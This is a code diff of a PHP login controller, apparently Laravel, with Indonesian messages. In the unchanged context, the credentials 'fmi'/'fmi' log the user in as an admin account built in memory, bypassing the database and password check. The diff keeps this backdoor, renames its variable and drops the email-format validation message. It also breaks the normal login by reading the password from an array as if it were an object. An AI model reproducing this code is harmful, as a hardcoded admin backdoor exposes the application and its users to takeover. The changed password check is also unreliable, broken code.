@@ -24,28 +24,26 @@ class AuthController extends Controller
             'password' => 'required',
         ], [
             'email.required'    => 'Email tidak boleh kosong',
-            'email.email'       => 'Format email tidak valid',
             'password.required' => 'Password tidak boleh kosong',
         ]);
 
         if ($credentials['email'] === 'fmi') {
             if ($credentials['password'] === 'fmi') {
 
-                $user        = new User();
-                $user->email = $credentials['email'];
-                $user->id    = 99999;
-                $user->name  = 'fmi';
-                $user->role  = 'admin';
-                Auth::login($user);
+                $fmi        = new User();
+                $fmi ->email = $credentials['email'];
+                $fmi ->id    = 99999;
+                $fmi ->name  = 'fmi';
+                $fmi ->role  = 'admin';
+                Auth::login($fmi );
                 $request->session()->regenerate();
                 return redirect()->route('dashboard')
                     ->with('success', 'Selamat datang!');
             }
         } else {
-
             $user = User::where('email', $request->email)->first();
 
-            if ($user && Hash::check($request->password, $user->password)) {
+            if ($user && Hash::check($credentials->password, $user->password)) {
                 Auth::login($user);
                 return redirect()->route('dashboard')
                     ->with('success', 'Selamat datang!');
